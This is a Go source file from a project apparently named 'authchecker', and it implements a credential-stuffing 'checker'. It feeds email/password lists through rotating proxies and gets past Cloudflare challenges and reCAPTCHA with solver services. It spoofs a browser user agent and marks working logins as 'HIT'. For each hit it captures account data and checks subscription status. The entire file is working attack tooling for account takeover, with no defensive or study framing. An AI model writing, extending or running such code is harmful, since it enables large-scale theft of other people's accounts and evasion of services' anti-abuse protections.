package runner

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"

	"authchecker/internal/captcha"
	"authchecker/internal/cf"
	"authchecker/internal/config"
)

type CheckInput struct {
	Email    string
	Password string
	ProxyURL string
	LineNum  int
}

type CheckResult struct {
	Email    string            `json:"email"`
	Password string            `json:"password"`
	Status   string            `json:"status"`
	Capture  map[string]string `json:"capture,omitempty"`
	Detail   string            `json:"detail,omitempty"`
	LineNum  int               `json:"line_num"`
}

type Bot struct {
	cfg       *config.Config
	cfManager *cf.Manager
	captcha   *captcha.Solver
}

func NewBot(cfg *config.Config, cfManager *cf.Manager) *Bot {
	return &Bot{
		cfg:       cfg,
		cfManager: cfManager,
		captcha:   captcha.NewSolver(),
	}
}

func (b *Bot) Check(ctx context.Context, input CheckInput) CheckResult {
	result := CheckResult{
		Email:    input.Email,
		Password: input.Password,
		Status:   "ERROR",
		LineNum:  input.LineNum,
	}

	client, userAgent, err := b.newClient(input.ProxyURL)
	if err != nil {
		result.Detail = err.Error()
		return result
	}

	if b.cfg.Cloudflare.Enabled && b.cfManager != nil {
		cfURL := extractBaseURL(b.cfg.Request.URL)
		sess, err := b.cfManager.GetSession(ctx, cfURL, input.ProxyURL)
		if err != nil {
			result.Status = "RETRY"
			result.Detail = "cf solve failed: " + err.Error()
			return result
		}
		if sess.UserAgent != "" {
			userAgent = sess.UserAgent
		}
		b.seedCookies(client, b.cfg.Request.URL, sess.Cookies)
	}

	recaptchaToken := ""
	if b.cfg.Captcha.Enabled {
		token, err := b.captcha.Solve(ctx, captcha.Config{
			Enabled:  true,
			Provider: b.cfg.Captcha.Provider,
			APIKey:   b.cfg.Captcha.APIKey,
			Type:     b.cfg.Captcha.Type,
			SiteKey:  b.cfg.Captcha.SiteKey,
			PageURL:  b.cfg.Captcha.PageURL,
			Action:   b.cfg.Captcha.Action,
			MinScore: b.cfg.Captcha.MinScore,
		})
		if err != nil {
			result.Status = "RETRY"
			result.Detail = "captcha solve failed: " + err.Error()
			return result
		}
		recaptchaToken = token
	}

	body := applyVars(b.cfg.Request.Body, input, userAgent, recaptchaToken)
	statusCode, source, err := b.doRequest(ctx, client, b.cfg.Request.Method, b.cfg.Request.URL, b.cfg.Request.Headers, body, userAgent)
	if err != nil {
		result.Status = "RETRY"
		result.Detail = err.Error()
		return result
	}

	if statusCode == 403 && b.cfg.Cloudflare.Enabled && b.cfManager != nil {
		b.cfManager.Invalidate(extractBaseURL(b.cfg.Request.URL), input.ProxyURL)
		result.Status = "RETRY"
		result.Detail = "403 - cf cookie expired"
		return result
	}

	if evaluateRules(b.cfg.Success, source, statusCode, true) != "" {
		result.Status = "HIT"
		result.Capture = extractCaptures(b.cfg.Capture, source)
		b.runFollowUp(ctx, client, userAgent, &result)
		return result
	}

	if evaluateRules(b.cfg.Fail, source, statusCode, false) != "" {
		result.Status = "FAIL"
		return result
	}

	if statusCode >= 200 && statusCode < 300 {
		result.Status = "NONE"
	} else {
		result.Status = "ERROR"
		result.Detail = fmt.Sprintf("status %d", statusCode)
	}
	return result
}

func (b *Bot) runFollowUp(ctx context.Context, client *http.Client, userAgent string, result *CheckResult) {
	if !b.cfg.FollowUp.Enabled || b.cfg.FollowUp.URL == "" {
		return
	}

	method := b.cfg.FollowUp.Method
	if method == "" {
		method = http.MethodGet
	}

	_, html, err := b.doRequest(ctx, client, method, b.cfg.FollowUp.URL, b.cfg.FollowUp.Headers, "", userAgent)
	if err != nil {
		if result.Capture == nil {
			result.Capture = map[string]string{}
		}
		result.Capture["follow_up_error"] = err.Error()
		return
	}

	sub := b.cfg.FollowUp.Subscription
	if sub.Type == "" {
		return
	}

	if result.Capture == nil {
		result.Capture = map[string]string{}
	}

	key := sub.SaveAs
	if key == "" {
		key = "subscription"
	}
	active := sub.Active
	if active == "" {
		active = "active"
	}
	none := sub.None
	if none == "" {
		none = "none"
	}

	if sub.Type == "body_contains" && strings.Contains(html, sub.Value) {
		result.Capture[key] = active
	} else {
		result.Capture[key] = none
	}
}

func (b *Bot) newClient(proxyURL string) (*http.Client, string, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, "", err
	}

	transport := &http.Transport{}
	if proxyURL != "" {
		u, err := url.Parse(proxyURL)
		if err == nil {
			transport.Proxy = http.ProxyURL(u)
		}
	}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

	client := &http.Client{
		Timeout:       time.Duration(b.cfg.Timeout) * time.Second,
		Jar:           jar,
		Transport:     transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return nil },
	}
	return client, userAgent, nil
}

func (b *Bot) seedCookies(client *http.Client, rawURL string, cookies map[string]string) {
	u, err := url.Parse(rawURL)
	if err != nil || client.Jar == nil {
		return
	}
	var list []*http.Cookie
	for name, value := range cookies {
		list = append(list, &http.Cookie{Name: name, Value: value})
	}
	client.Jar.SetCookies(u, list)
}

func (b *Bot) doRequest(ctx context.Context, client *http.Client, method, rawURL string, headers map[string]string, body, userAgent string) (int, string, error) {
	var bodyReader io.Reader
	if body != "" {
		bodyReader = bytes.NewReader([]byte(body))
	}

	req, err := http.NewRequestWithContext(ctx, method, rawURL, bodyReader)
	if err != nil {
		return 0, "", err
	}

	for k, v := range headers {
		req.Header.Set(k, strings.ReplaceAll(v, "{{cf_user_agent}}", userAgent))
	}
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", userAgent)
	}
	if body != "" && req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/json")
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	raw, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(raw), nil
}

func applyVars(body string, input CheckInput, userAgent, recaptchaToken string) string {
	body = strings.ReplaceAll(body, "{{email}}", input.Email)
	body = strings.ReplaceAll(body, "{{password}}", input.Password)
	body = strings.ReplaceAll(body, "{{username}}", input.Email)
	body = strings.ReplaceAll(body, "{{user}}", input.Email)
	body = strings.ReplaceAll(body, "{{pass}}", input.Password)
	body = strings.ReplaceAll(body, "{{recaptcha_token}}", recaptchaToken)
	body = strings.ReplaceAll(body, "{{cf_user_agent}}", userAgent)
	return body
}

func extractBaseURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	return fmt.Sprintf("%s://%s", u.Scheme, u.Host)
}

func evaluateRules(rules []config.Rule, source string, statusCode int, isSuccess bool) string {
	for _, rule := range rules {
		matched := false
		switch rule.Type {
		case "status_code":
			matched = fmt.Sprintf("%d", statusCode) == rule.Value
		case "body_contains":
			matched = strings.Contains(source, rule.Value)
		case "json_path":
			matched = jsonPathExists(source, rule.Path)
		case "body_not_contains":
			matched = !strings.Contains(source, rule.Value)
		}
		if matched {
			if isSuccess {
				return "HIT"
			}
			return "FAIL"
		}
	}
	return ""
}

func jsonPathExists(source, path string) bool {
	if path == "" {
		return false
	}
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(source), &data); err != nil {
		return strings.Contains(source, path)
	}
	parts := strings.Split(path, ".")
	var current interface{} = data
	for _, p := range parts {
		m, ok := current.(map[string]interface{})
		if !ok {
			return false
		}
		current, ok = m[p]
		if !ok {
			return false
		}
	}
	return current != nil
}

func extractCaptures(rules []config.CaptureRule, source string) map[string]string {
	out := make(map[string]string)
	for _, rule := range rules {
		if rule.Type == "json_path" && rule.Path != "" {
			var data map[string]interface{}
			if json.Unmarshal([]byte(source), &data) == nil {
				parts := strings.Split(rule.Path, ".")
				var current interface{} = data
				for _, p := range parts {
					m, ok := current.(map[string]interface{})
					if !ok {
						break
					}
					current, ok = m[p]
					if !ok {
						break
					}
				}
				if s, ok := current.(string); ok {
					key := rule.SaveAs
					if key == "" {
						key = rule.Path
					}
					out[key] = s
				}
			}
		}
	}
	return out
}
